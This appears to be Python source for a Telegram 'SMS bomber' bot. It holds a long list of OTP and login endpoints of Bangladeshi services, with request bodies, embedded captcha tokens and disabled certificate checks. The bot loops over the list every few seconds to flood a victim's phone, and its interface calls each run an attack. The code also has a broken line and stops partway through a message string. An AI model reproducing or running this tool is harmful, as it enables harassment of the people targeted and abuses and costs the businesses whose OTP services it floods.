import os
import requests
import time
import logging
import re
import threading
import asyncio
from datetime import datetime
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ============================================================
#                    CONFIGURATION
# ============================================================

# Fly.io-তে টোকেনটি "TELEGRAM_BOT_TOKEN" নামে রাখা নিরাপদ ও স্ট্যান্ডার্ড
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN") or os.getenv("BOT_TOKEN")
DEVELOPER_ID = "Mr Fixer"

# Global variables
active_attacks = {}
stop_signals = {}

# ============================================================
#                    API COLLECTION (From SMS Bomber API)
# ============================================================

ULTIMATE_APIS = [
    # ==================== WALTON PLAZA ====================
    {
        "name": "Walton Plaza OTP",
        "method": "POST",
        "url": "https://waltonplaza.com.bd/api/auth/otp/create",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"auth":{{"countryCode":"880","deviceUuid":"ee757830-f639-12f0-9f4d-2f972746fhg","phone":"{phone}"}},"captchaToken":"recapcha"}}'
    },
    
    # ==================== APEX 4U ====================
    {
        "name": "Apex4u Login",
        "method": "POST",
        "url": "https://api.apex4u.com/api/auth/login",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
    },
    
    # ==================== EASY BD ====================
    {
        "name": "Easy BD Forgot Password",
        "method": "POST",
        "url": "https://core.easy.com.bd/api/v1/forgot-password-otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"device_key":"2ea97d276a980993308116baa292cec9","mobile":"{phone}"}}'
    },
    
    # ==================== BIKROY ====================
    {
        "name": "Bikroy.com",
        "method": "GET",
        "url": lambda phone: f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
        "headers": {},
        "data": None
    },
    
    # ==================== CHARDIKE ====================
    {
        "name": "Chardike OTP",
        "method": "POST",
        "url": "https://api.chardike.com/api/otp/send",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","otp_type":"login"}}'
    },
    
    # ==================== BTCL ====================
    {
        "name": "BTCL OTP",
        "method": "POST",
        "url": "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNbr":"{phone}","OTPType":1.0,"userName":"","email":""}}'
    },
    
    # ==================== AMAZON AWS ====================
    {
        "name": "AWS OTP Send",
        "method": "POST",
        "url": "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    
    # ==================== OTITHEE ====================
    {
        "name": "Otithee OTP",
        "method": "POST",
        "url": "https://gateway.otithee.com/api/v1/generate-otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"request_type":"registration","mobile_number":"{phone}"}}'
    },
    
    # ==================== QUIZGIRI ====================
    {
        "name": "Quizgiri OTP",
        "method": "POST",
        "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+88","phone":"{phone}"}}'
    },
    
    # ==================== MOJARU ====================
    {
        "name": "Mojaru Student Login",
        "method": "POST",
        "url": "https://new.mojaru.com/api/student/login",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_or_email":"{phone}"}}'
    },
    
    # ==================== GP APPCITY ====================
    {
        "name": "GP AppCity OTP",
        "method": "POST",
        "url": "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    
    # ==================== GARIBOOK ====================
    {
        "name": "Garibook Login v3",
        "method": "POST",
        "url": "https://api.garibookadmin.com/api/v3/user/login",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"recaptcha_token":"garibookcaptcha","mobile":"{phone}","channel":"web"}}'
    },
    {
        "name": "Garibook Login v4",
        "method": "POST",
        "url": "https://api.garibookadmin.com/api/v4/user/login",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}}'
    },
    
    # ==================== BIOSCOPELIVE ====================
    {
        "name": "Bioscopelive Auth",
        "method": "POST",
        "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"+880{phone}"}}'
    },
    
    # ==================== BANGLADESHI MATRIMONY ====================
    {
        "name": "BD Matrimony",
        "method": "GET",
        "url": lambda phone: f"https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={phone}",
        "headers": {},
        "data": None
    },
    
    # ==================== UPAY SYSTEM ====================
    {
        "name": "Upay Wallet Verification",
        "method": "POST",
        "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"wallet_number":"{phone}","geo_location":{{"lat":23.8979093,"long":89.1356346}},"referral":"","firebase_token":"e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI","device_uuid":"c65m117a8cbf5b1851b29f8b","mno":"Robi"}}'
    },
    
    # ==================== CHORKI ====================
    {
        "name": "Chorki Auth",
        "method": "POST",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"+880{phone}"}}'
    },
    
    # ==================== DEEPTOPLAY ====================
    {
        "name": "DeeptoPlay Login",
        "method": "POST",
        "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"+880{phone}"}}'
    },
    
    # ==================== REDX ====================
    {
        "name": "RedX Registration OTP",
        "method": "POST",
        "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
    },
    
    # ==================== BOHUBRIHI ====================
    {
        "name": "Bohubrihi OTP",
        "method": "POST",
        "url": "https://bb-api.bohubrihi.com/public/activity/otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"login"}}'
    },
    
    # ==================== TIMEZONE BD ====================
    {
        "name": "Timezone OTP Login",
        "method": "POST",
        "url": "https://backend.timezonebd.com/api/v1/user/otp-login",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    
    # ==================== GP FWA ====================
    {
        "name": "GP FWA OTP",
        "method": "POST",
        "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","language":"en","email":""}}'
    },
    
    # ==================== SHIKHO ====================
    {
        "name": "Shikho OTP",
        "method": "POST",
        "url": "https://api.shikho.com/public/activity/otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"ap-discount-request"}}'
    },
    
    # ==================== EDGE COURSE BD ====================
    {
        "name": "Edge Course Register",
        "method": "POST",
        "url": "https://edgecoursebd.com/register",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'[{{"phone":"{phone}"}}]'
    },
    
    # ==================== GHOORI LEARNING ====================
    {
        "name": "Ghoori Learning OTP",
        "method": "POST",
        "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_no":"{phone}"}}'
    },
    
    # ==================== OSTAD ====================
    {
        "name": "Ostad With OTP",
        "method": "POST",
        "url": "https://api.ostad.app/api/v2/user/with-otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    
    # ==================== IEDUCATION ====================
    {
        "name": "iEducation Check User",
        "method": "POST",
        "url": "https://www.ieducationbd.com/api/account/check_user",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    
    # ==================== SHWAPNO ====================
    {
        "name": "Shwapno Auth",
        "method": "POST",
        "url": "https://www.shwapno.com/api/auth",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"+880{phone}"}}'
    },
    
    # ==================== DOCTIME ====================
    {
        "name": "Doctime Authenticate",
        "method": "POST",
        "url": "https://api.doctime.net/api/v2/authenticate",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_calling_code":"88","contact_no":"{phone}","timestamp":1777760060}}'
    },
    
    # ==================== MBONLINE ====================
    {
        "name": "MB Online OTP",
        "method": "POST",
        "url": "https://mbonlineapi.com/api/front/send/otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"CellPhone":"{phone}","type":"login"}}'
    },
    
    # ==================== GP WEBLOGIN ====================
    {
        "name": "GP Web Login OTP",
        "method": "POST",
        "url": "https://webloginda.grameenphone.com/backend/api/v1/otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    
    # ==================== KIREI ====================
    {
        "name": "Kirei Login OTP",
        "method": "POST",
        "url": "https://frontendapi.kireibd.com/api/v2/send-login-otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"email":"{phone}"}}'
    },
    
    # ==================== KARIGORI ====================
    {
        "name": "Karigori OTP",
        "method": "GET",
        "url": lambda phone: f"https://api.karigoripathsala.com/api/get-otp?phone={phone}",
        "headers": {},
        "data": None
    },
    
    # ==================== BINGE BUZZ ====================
    {
        "name": "Binge Buzz OTP",
        "method": "POST",
        "url": "https://api.binge.buzz/api/v4/auth/otp/send",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+880{phone}"}}'
    },
    
    # ==================== NEXOPET ====================
    {
        "name": "Nexopet OTP",
        "method": "POST",
        "url": "https://host03pet.nexopet.com/api/v1.0/users/send-otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    
    # ==================== MEDICO BIO ====================
    {
        "name": "Medico Passwordless Login",
        "method": "POST",
        "url": "https://api.v2.medico.bio/patient/passwordless-login",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","deviceId":"{phone}","channel":"web","userType":"patient","type":"newUser"}}'
    },
    
    # ==================== PRACTICE CLUB ====================
    {
        "name": "Practice Club Register",
        "method": "POST",
        "url": "https://www.practiceclub.net/register",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"_token":"JIxET3bBSKUbbUvS0FxcEaMJr0IkXp2KYPsAsoKZ","contact_no":"{phone}"}}'
    },
    
    # ==================== RELAXY ====================
    {
        "name": "Relaxy OTP Send",
        "method": "POST",
        "url": "https://dev.api.relaxy.com.bd/api/v1/otp/send",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"+880{phone}","appSignature":"your_app_signature"}}'
    },
    
    # ==================== EPHARMA ====================
    {
        "name": "Epharma Send OTP",
        "method": "POST",
        "url": "https://epharma.com.bd/authentication/send-otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"+880{phone}","recaptcha_token":"0cAFcWeA4k2NiVbnurktP7fw6znVu--bAdr9aZl_3jujF8TioghwxDvWKORN_UGXEOqYE0JqrxYgMAaQqDmFvwfYO-Mk5Y0rpPHRSCfXileu5kxtrsrvRF6cOyEjnxxtlOnRoecCdps3ofvb-XkdeeGqpBjhzTVe0mubnkRIPYoo_V6HRE5ias_qPqddVhfjgVQW-CZmwgEE8zUZGf4NKenZUery3aSBYT1Nf_kk4QpXr1bT_P9TLctw98SK9sU5sxble4hpvpC9XpyFuWShtpGvOKppptAbP4UZ1B2Ao_UCHFSaA8zPJlD7iNa_r4fmH9tPZ9-1arDoE6PVeeG27HAWwZpEds4GDk3ZTSd33uGOkuzGLAbpKTGaEa-eBcQOBQLg7yoyK1qxvpK0wN6z9JHcXfpWQp7d9Cc46jZkn8G57j7yzavZsnuLvl98UDTU68dmvIOMEF6j1b6w6DwHZVdtUj8H3Z4homFgE4wFWxrFSLEbSeAf0BFa_ExGcaAGsGIHxdXeHdaFBiHNgNfIc45MqLk4MowBhVRu7LP-xAhZ2ocN_Wvv2y2xQV4jfTCCjX72bgGr6bwm69X42x0HrjVoDwjdWozlG4Vm5GeSSzTSSBvBaPwolQ80jCLCia2FlQrTq_jLCeqXRM07ZxAdAwRAwpfFuG7PlBDYLMLgHAEVoQPvtIN8AT68OE_WGEGWZpDAsVKhNtMihWPFE0ByERUm2vAkTW-FU_f2rx5KaoGLh5zPDZMQ9TFsk09ibLcDg910VdxiXiP9pVGMiNX-7Oc6vxqyaNVUevJ0xpXyAqOmwyxziji8YtS_gMkGvMf59J_qxYqoR2fxh2rCMgkITSa8mzwDIC9eVYGdZer-6kOmpygb3iWvXI9cbQLlo7Jn4q1r8XnUV92meLMwoy55Eb487jff947WTgWUztozN9SvjB9qqy5h9GuTTPEfT91tpY5SU7rJZYtvMJJkytQMiT8JsXSjjcYCLcmcVM8hRseXIZpBiHGJ02eTTNHf80QbtCqlPWJADORlW3p2Pk-4-NNcEdylJmIVDwsOGHjoNxtBLTh6AjNvvaowTHHEmdgVIAaVlf2CoFJvHPe3XzPls2kDi4BHyKYk82jTqR8KI1LvV-h4MffUaZHzSLTzxQlwx2U4GnMh8Jo6VnJujXQC7_kn7LRgqUDoGHZtdbImsOjXMlEkBoeltBHlECCC3dZrnuEHuqaGQFtZATJfemw0hVn-naBflCBFFiLFBY2pCZHJndQrUSw_9kCqgmBImHlQDN1mK-aqzoO2JgBA4alPFKPrpfUu_vLKOiJolv0hORyPXhCY0k1pyIV_IQtNHcFy34g1eRGEWuiAW3sQzCq6vIMbDDaC0zZiscgj5ejxJqEhhR8PARVqCaqn-aEh7uk7AcDF3wudz4pCp8Lp-pdEK3obOfhdxmEf4iz0eO9ZDu2vNnV5tu9m7pg9YJ5-b1lVglQDy8gGfelLXVeyC-vl-oBpkyWJyBUxEcRAMJktnmtjXH2Akv1mJeXcRFLwTz-ohkbqb1e3U52MMDBikT20Rd1we7Z_613qYOFKYGdREx1d_kHnUnAEnc25NXgVpWRQRGoXHdfAyph5tgYQsQBhpZRw5IytLEYrlLBdyawYh9KKI3hGCUG_C2pLbhMPIM7salPTTnxiOr2nFiZEMCvrjxLtY5pQ_m1ayGGCnkyu5xQ4H3gZ7pvReyaWg30mG7v2i2E-7V9QrkwIlgeGga2rW6wFChalICHuuStj1uLcU5NO_uLg0vbmGLUpsOoQiGbDXe3E-bFqYpTmqTsh_7MBRd32sydnYhRY2Aot_LmFtztzs5_FxXa4qFpfDlqq5GBS58wFiOCvXngf-kNLGD8raVU4qpq-_y4ZkCiw9XME2LoPt0NQyMo1PES0DE9pqbRibg2uVXcKqbK4ngh04uKN_1Fh9HcZOQ2V76bIS-7OHqSlebsQHczMSrrvcOGIOk8oyGN-mzz7K9zD9sespdGm-BDvZpziDPAEQF-lWpIasWeqmlB7jIWiFzjBxj9DLuYNYt0A8qrw4_lL0UIIuKV96jBkxzb80xx6aCtB6M5do7dp7LpODIwQF-ZUdVAaTJHc7HtIikC9TK8fgvzEE9-Edz7Aetp741DHSvlmIJBsALJMgKa7bnoF4IRjbsBHivZwK4_mzRviHLmqfokzWbHhwCASJDw_cJzmG53RcPMsi0Cf8WBANjNT5-LYiELI9U7TjPw6T34oYzlUxyzRH02qTIzcuh3ZA_SG6L3LWcErgPsCL1a_UEzGDH48mzZx7EXYpWn2_OANLwUpy9_Ms9jiOBzOshiYfxbymvEx7oz3J-zN0egyEhhv-_ZWGc0mZPK-BBJEseKSzx3DPw3T4wIKfZdJ2C4MJcri8cJWJyWIE4SBljmqvsXoLXzbkqBxMBeP_IIM2YVLPD3ls_J1xU4L4-nlEyeT0PzywxU6w9C_u6Lda5MPXlc3Yywx-sPnzSmRCaOWWE8x6OyBUsyp0bTvp3CCprWXio-8L6Ow"}}'
    },
    
    # ==================== CARE BOX ====================
    {
        "name": "Care Box Register",
        "method": "POST",
        "url": "https://newprod.api-care-box.click:444/api/user/register/?version=otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"Name":"MD Hasan","Phone":"+880{phone}","token":"0cAFcWeA6e2L6W9hSYyyrDV405F-UimyroN-w1CPP47Z_-elrIaErha4aZQDXM7LfBcId23qxV4Eklkv2XAF7qAU03mEAOkf4Kn_RtjBL5Eyy_Q11wrGurCyROTcYvIR3YR6XatPF3605_JwPPt-WLN6yjx5IHCTEqXanxVr6M2jDzBNbkl0_AazNNcifWJSye-i7F4uttVqUB4NixWs7CD-LLylTOStM0X1gMyiUvp6zcmnmBYQkLBc2C3JfP7fq7JDnHhBAu-d1WHKVTZO13KhFJVltA2XAaf5IBA99Bho2ZFKrSomPr1aeS_XBKMZJHSaWCqmIJuNmSNQ1g3v5eJs62Hy1yvkCRcE8w79_eo9F06IPqmUb0LaQFA9LvMSzqCY-Z8Py_2NxrwjL2zIL9rw4T7ViueRj6tTKe1sn9UNXy3aJ5BYMBFC7hUjAi3MvVxl862gGaWKfLgwWolA3wvX1aMz7w-KXKGFxFae3QLhwH-MyzqoPc9gYzODBdAZKXViiN5Tql8tChgKqcoqTS_vsPZbjALf8AaHwxgj9sAG-pm8WJfsAvfT3gBY29sZ9t9C6QGr_745g1YzMN3FZ2mkWD07DR5U3bkMm6bM1sCk3KJl4b1XaG0yNzQl3yBh-qN-UC_EfRxOP6dHiqpfPrY2pmyTjGgTaoXKx1qmOdGmHbJNAZsBU2jkxbt0OW6-IV5bQNDJ899FTXUFUN6Tlm22IQxU9g3pa_aU2eFoHFWnxKuMP1Bzx5FWz4W92h97mKXlUdgniW9YJGH2kE39qJH2TKxm7CHJlcuPhehAKkPPviP-u9GeCS6ywctYCwDQQCY-6cxDG1RAgFF8FBHP8jsHamrIpo5P5IuPW6zR5_1zDPuHjw2PvDXMS2nKGqrMp_qUOPZj_JPOm2Usm7yMROUr5rySjsI4eYApCbWMMIgGGw7L-VvQ77fr8qoVGQFwXbNDFFfRPX0REmPhVlxmuvfQH7QIXbY42l4rjlClT4nlf0k_fBZwlZethzduxEq5xtzrzG0MJlwRaKMH2E5U5XL5yUyRwxdBbrdDBXJ8BHdemWrG6NOgoR5ZGna7UKpAjZ-qSEYGrz4ApH54gNUqjDYwAQ6fUwOPvIRTLGcktzG29uuWet-TgMveC927gyxu8YuSLeJWNWLm0WyBhQZSigCvieOQS98AULda5oOC72aoOd8wyy_r8aQatjrimOZgWlBEXFMnML7dwFn6JOcyLKWYNCWjaYrRegkyYhR34wsx3lZelaVFJXevEM2baR_mTuPjz6zo-Vem3T2rB4MtoZfuJQx149lf4W7VEM9sJ5k1JXvNYeb4tgFcRBqnCvrHa2lTFl074b5IbWte9Q48bAQMqzQUHe8BJ05qDFsdsPFDF8Hxq3r7t_pbZiU_vHi8SroTHBgy9oKRuPO56EN906jEy8bN-2AV3qrgNw3SWMl65ejpiPe6lLE3QCCM8HPvmow_imjGkNqrRP6Bauvg2QeZTxJe1m-XK5-TD7Ye4AogRiP3heqqwHqUtT2HJRvY-qTQr9gTf2y3zltKel8oyhwM-iN6TTVxHpNNF0hx-1DeUQuhiQc-Xr43J1jXtRa40E_MihUPpXhlf52djJNjYWbnuUvVNXA7RiWcqtHfBtEM-tNhTLvpcBEvwf4E__wvzvCAURLHCnb47Ec2dyD_YKRPcPGP1yn_gYoIdpjXQjRKFBjXl5NLHZYvpAzst2gnb67dIJSc4_a1GgqaMwZrRd3vLy26a1vLkJlgS-R7QSJ7WFjDIUMeYAWdnELGPMq09wvLBuJpxb4d4cSW4uWQiamK81fDAnuNqK2Nfai3O9xEoV0OMfkN5djjFuVxP75r-y6CvCx82qAILjZ1VvhXeKE3x5JqcnHtmgr8rmMhtpStgDR46NjBUCBxU7MpW609f9IECRVG1uhltWZCwLiO-3nmqNrsJl3_croLeW0DCcmBczHZeGEXjfHQJUcwlcJfJt3i0H3EOuKvrRmH85J97oaLm0L2EReBGQPtmFSHGSFB7HHmoGI3WJ2Wzs0ZASsccNX6sG-Qc6GEkYbH8YEoOwhhDDzR96yqEspOlxzr3VGlo-OEX3PNZP91A4ZIKgm1JCeWozVNdq0_3P2AWWH9dKz5l_V9KUTVKLo_Mqn1YWsz7kN3cdgam7aGmaOlMUfrMGUaVT0l7pJoJvTL4I94bfchHL-QBH4Y4DGFxNB7ldb5-8LMzCP5Hcc42wes7kfie0QpkuoOhnXyzLmOo9BtjDibSPjXylYM1TUwdLt3WOChFQoRUr1zeJhRtr4w66_cQCCNbWoezg3LiGN5jFkeNgrofc2sQvJqDCPSFBQr10Uu--4gxiYp4Z9qnzgQfffVcF3H1n9D_0aLkRu_ciyEzdCWsmo6N1joLt1yF7KGZ52Vrv-L1gwgB8OVs"}}'
    },
    
    # ==================== BD TICKETS ====================
    {
        "name": "BD Tickets OTP",
        "method": "POST",
        "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+880{phone}"}}'
    },
    
    # ==================== BUS BD ====================
    {
        "name": "Bus BD Access Code",
        "method": "POST",
        "url": "https://api.busbd.com.bd/api/access-code",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+880{phone}"}}'
    },
    
    # ==================== JATRI RETAIL ====================
    {
        "name": "Jatri Retail OTP",
        "method": "POST",
        "url": "https://api.retail.jatri.co/auth/api/v1/send-otp",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","purpose":"USER_LOGIN","deviceType":"WEB","cloudFlareToken":"0.nyW77dtMv_V7iYtpdKhh44-0ronPOgkZySdaruG7cNKBrfOpsxPTz7WTs4e6emE6sE-cPtEgVCjTuqWodAuR66y6WKiVxGOHI5KWvy6TfhbA8X99MMZzQz1oRf-FVnjdkGJrgkB-5d644-8HhgTLYjkb09sl2IUPyTD1JthrqVjxz2-tUP2MdW1Zq00PZKPwarFVp7pFMXmyu2QkgwdvLYhmQOM-NUK4Hvwq6E63U17aMFvFU1VDsYh8jXcpnsbmRl7ct_cKZZ2dZbAyQWdZcU8TC9Jzli7krKGtD82Nktr1QmkjKVKeNtgRZAa8IKGCgSCVsU1GqxAPIOXD2wcoTbAqmUJtfecoXH4efP0FTg7gr8CIFzzb58ezfzD8h0XuZsuzoDfy9ZRRWByCSNRUddAb1VsuMcrjil-jJ46Q3geZtjXMm4FJe-HrK1oETV450FJ5K5a58nTML5y69N4mJ3G3g06-yyXDLLfRPDRaGA1W3lfmKHpNf6icWZsfokP_QhuO3IGEfAobdk_V4LBu7LIwF0_IBo1JVHJsTa3dsnBMuNVsmSMzlOvFs69q9OXiqP2u4qJjwCaXVlp8AvLpzd-kyEtP5SbuNXaUbtbJVhImB6BTmSLAuhsIGirPJjMXJvnRSX3CostIC_1PizO6Ck7nlVpzjAlGHTa8gTy7krpNBF6P78bN7wO6eRCM6kGZFfBU3sv6nSB96yXr-rtlBREavVhTHl76Qioa9V2rYVmmeEb4VSYJexXM9zgqHWY8GPzQoMRrasaGb5x1_5_CufwBRZaJbWAlqS6shZ6dhNQiuRIO3hIYBvXYpXEI8XSuxm5l7IIg0HyyYSHhM99P0-B6ubyvk1kzMy2nvbUrampkb_B1RVP2AfoGnF86Jw-lt_KPGBiCO1zUfXat4slFB0HxKMBI40eJ4Z15-MXgofUP7Est3zFDrrACpq2vWIsgAJETdQ636YiCAg8UvUVPYw.qR0KO6WfzqY7ZwDrZj67_Q.d3def0b44ab766c7f9d0290014f5c6e378996165f983460860563801a084fe26"}}'
    },
]

# ============================================================
#                    API CALL FUNCTION
# ============================================================

def hit_api(api, phone):
    """Hit a single API endpoint"""
    try:
        url = api["url"]
        if callable(url):
            url = url(phone)
        
        data = api["data"](phone) if api["data"] else None
        
        if api["method"] == "GET":
            response = requests.get(url, headers=api["headers"], timeout=5, verify=False)
        else:
            response = requests.post(url, headers=api["headers"], data=data, timeout=5, verify=False)
        
        # সফল রেসপন্স কোডগুলোর লিস্ট (যেমন: 200, 201) এখানে যুক্ত করে দেওয়া হয়েছে
        if response.status_code in:
            return True
    except Exception as e:
        logger.debug(f"API {api.get('name', 'Unknown')} failed: {str(e)}")
    return False
# ============================================================
#                    ATTACK FUNCTION
# ============================================================

def run_attack(user_id: int, phone: str, update: Update):
    """Run the attack loop"""
    stats = {
        "total": 0,
        "success": 0,
        "failed": 0,
        "apis": len(ULTIMATE_APIS),
        "phone": phone,
        "start_time": time.time(),
        "cycles": 0
    }
    
    active_attacks[user_id] = {
        "phone": phone,
        "stats": stats,
        "update": update
    }
    
    stop_signals[user_id] = False
    
    while not stop_signals.get(user_id, False):
        try:
            stats["cycles"] += 1
            
            success_count = 0
            for api in ULTIMATE_APIS:
                if hit_api(api, phone):
                    success_count += 1
                stats["total"] += 1
            
            stats["success"] += success_count
            stats["failed"] += len(ULTIMATE_APIS) - success_count
            
            elapsed = time.time() - stats["start_time"]
            minutes = int(elapsed // 60)
            seconds = int(elapsed % 60)
            
            status_text = f"""
╔═══════════════════════════════════════════╗
║      🔥 ATTACK IN PROGRESS 🔥            ║
╚═══════════════════════════════════════════╝

┌───────────────────────────────────────────┐
│  📱 TARGET: <code>{phone}</code>            │
│  🔄 CYCLE: #{stats['cycles']}              │
│  ⏱️ DURATION: {minutes}m {seconds}s        │
└───────────────────────────────────────────┘

┌───────────────────────────────────────────┐
│  📊 LIVE STATISTICS                       │
├───────────────────────────────────────────┤
│  🚀 TOTAL REQUESTS: {stats['total']}      │
│  ✅ SUCCESSFUL: {stats['success']}        │
│  ❌ FAILED: {stats['failed']}             │
│  📡 ACTIVE APIs: {stats['apis']}          │
└───────────────────────────────────────────┘

┌───────────────────────────────────────────┐
│  ⚡ STATUS: <b>ATTACKING</b>               │
│  ⏳ NEXT CYCLE: 3 seconds                 │
└───────────────────────────────────────────┘

⚠️ <i>Press STOP to terminate attack</i>
            """
            
            try:
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
                    [InlineKeyboardButton("📊 LIVE STATS", callback_data="view_stats")],
                    [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu")]
                ])
                
                update.effective_message.edit_text(
                    status_text,
                    parse_mode='HTML',
                    reply_markup=keyboard
                )
            except Exception:
                pass
            
            time.sleep(3)
            
        except Exception as e:
            logger.error(f"Attack error: {e}")
            time.sleep(3)
    
    elapsed = time.time() - stats["start_time"]
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    
    final_text = f"""
╔═══════════════════════════════════════════╗
║      ✅ ATTACK COMPLETED ✅              ║
╚═══════════════════════════════════════════╝

┌───────────────────────────────────────────┐
│  📱 TARGET: <code>{phone}</code>            │
│  🔄 TOTAL CYCLES: {stats['cycles']}       │
│  ⏱️ DURATION: {minutes}m {seconds}s        │
└───────────────────────────────────────────┘

┌───────────────────────────────────────────┐
│  📊 FINAL STATISTICS                      │
├───────────────────────────────────────────┤
│  🚀 TOTAL REQUESTS: {stats['total']}      │
│  ✅ SUCCESSFUL: {stats['success']}        │
│  ❌ FAILED: {stats['failed']}             │
│  📡 ACTIVE APIs: {stats['apis']}          │
└───────────────────────────────────────────┘

┌───────────────────────────────────────────┐
│  📈 SUCCESS RATE:                        │
│  <b>{int((stats['success']/stats['total'])*100 if stats['total'] > 0 else 0)}%</b>                           │
└───────────────────────────────────────────┘

⭐ <i>Thank you for using Fixer Bomber Bot!</i>
    """
    
    try:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
            [InlineKeyboardButton("📊 STATISTICS", callback_data="view_stats")],
            [InlineKeyboardButton("ℹ️ HELP", callback_data="show_help")]
        ])
        
        update.effective_message.edit_text(
            final_text,
            parse_mode='HTML',
            reply_markup=keyboard
        )
    except Exception:
        pass
    
    if user_id in active_attacks:
        del active_attacks[user_id]
    if user_id in stop_signals:
        del stop_signals[user_id]

# ============================================================
#                    BOT HANDLERS
# ============================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_name = update.effective_user.first_name or "User"
    
    welcome_text = f"""
╔═══════════════════════════════════════════╗
║                                          ║
║     🎯 WELCOME TO OUR BOMBER BOT        ║
║                                          ║
║     <b>GX SMS BOMBER BOT v4.0</b>          ║
║                                          ║
╚═══════════════════════════════════════════╝

┌───────────────────────────────────────────┐
│  👤 HELLO, <b>{user_name}</b>               │
│  🤖 DEVELOPER: {DEVELOPER_ID}            │
│  📡 TOTAL APIs: {len(ULTIMATE_APIS)}     │
└───────────────────────────────────────────┘

┌───────────────────────────────────────────┐
│  📌 HOW TO USE:                          │
│  1️⃣ Click "START ATTACK" button         │
│  2️⃣ Enter 11-digit phone number         │
│  3️⃣ Attack will start automatically    │
│  4️⃣ Press "STOP" to terminate          │
└───────────────────────────────────────────┘

┌───────────────────────────────────────────┐
│  ⚡ FEATURES:                            │
